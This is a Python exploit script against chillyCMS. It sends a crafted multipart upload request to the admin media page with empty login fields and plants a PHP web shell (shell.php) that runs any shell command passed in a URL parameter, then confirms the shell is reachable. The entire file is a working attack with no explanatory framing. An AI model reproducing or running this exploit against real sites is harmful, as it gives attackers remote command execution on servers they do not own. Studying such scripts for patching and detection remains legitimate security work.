import socket

host = 'localhost'
path = '/chillyCMS'
shell_path = path + '/tmp/shell.php'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send('POST ' + path + '/admin/media.site.php HTTP/1.1\r\n'
           'Host: localhost\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: 731\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Accept: text/html\r\n'
           'Accept-Encoding: gzip,deflate,sdch\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="name"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="pw"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="sentfile"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="destination"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="action"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="file"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="parent"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="newfolder"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="folder"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
           'Content-Type: application/octet-stream\r\n'
           '\r\n'
           '<?php echo \'<pre>\' + system($_GET[\'CMD\']) + \'</pre>\'; ?>\r\n'
           '------x--\r\n'
           '\r\n')

    resp = s.recv(8192)

    http_ok = 'HTTP/1.1 200'
    found = 'HTTP/1.1 302'
    
    if found not in resp[:len(found)]:
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    if http_ok not in s.recv(8192)[:len(http_ok)]: print 'shell not found'        
    else: print 'shell located at http://' + host + shell_path

upload_shell()